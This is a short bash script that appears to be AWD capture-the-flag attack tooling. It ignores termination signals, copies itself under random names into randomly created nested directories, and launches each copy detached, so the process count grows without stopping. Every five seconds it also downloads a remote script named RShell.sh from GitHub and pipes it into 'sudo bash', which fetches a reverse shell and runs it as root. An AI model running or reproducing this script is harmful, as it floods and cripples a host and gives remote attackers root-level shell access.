#!/bin/bash 


SOURCE_DIR="$HOME/script_source"

mkdir -p "$SOURCE_DIR"
trap '' INT TERM HUP QUIT ABRT TSTP

get_random_dir() {
    local dirs
    dirs=("$SOURCE_DIR")
    
    while IFS= read -r -d '' dir; do
        dirs+=("$dir")
    done < <(find "$SOURCE_DIR" -type d -print0)

    for item in "$SOURCE_DIR"/*; do
        if [ -d "$item" ]; then
            dirs+=("$item")
        fi
    done

    if [ ${#dirs[@]} -eq 1 ]; then
        local new_dir
        new_dir="$SOURCE_DIR/dir_$(openssl rand -hex 4)"
        mkdir -p "$new_dir"
    fi


    local selected_dir="${dirs[$RANDOM % ${#dirs[@]}]}"

    local new_subdir
    new_subdir="$selected_dir/dir_$(openssl rand -hex 4)"
    mkdir -p "$new_subdir"


    echo "$new_subdir"
}

generate_random_name() {
    local name_len=$(( RANDOM % 10 + 5 ))
    openssl rand -hex "$name_len"
}

copy_and_run() {
    local target_dir
    target_dir=$(get_random_dir)
    local new_name
    new_name=$(generate_random_name).sh 
    
    mkdir -p "$target_dir"
    
    if cp "$0" "$target_dir/$new_name"; then
        chmod +x "$target_dir/$new_name"
        (cd "$target_dir" && setsid "./$new_name" &)
    else
        return 1
    fi
}

main() {
    while true; do
        sleep 5
        copy_and_run
        (wget -qO- "https://github.com/gubaiovo/PWN-Scripts/raw/main/scripts/AWD/RShell.sh" | sudo bash &)
    done
}

main